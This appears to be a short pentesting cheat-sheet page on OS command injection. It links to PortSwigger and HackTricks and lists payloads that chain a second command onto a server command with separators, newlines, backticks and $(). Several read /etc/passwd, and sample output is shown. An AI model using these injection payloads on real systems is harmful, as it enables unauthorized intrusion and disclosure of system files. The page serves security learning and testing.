# Command Injection

{% embed url="https://portswigger.net/web-security/os-command-injection" %}

{% embed url="https://book.hacktricks.xyz/pentesting-web/command-injection" %}

#### Basic commands

Execute the command and voila :p

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```

#### Chaining commands

```
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls   # Only if the first cmd fail
```

Commands can also be run in sequence with newlines

```
original_cmd_by_server
ls
```

#### Inside a command

```
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```
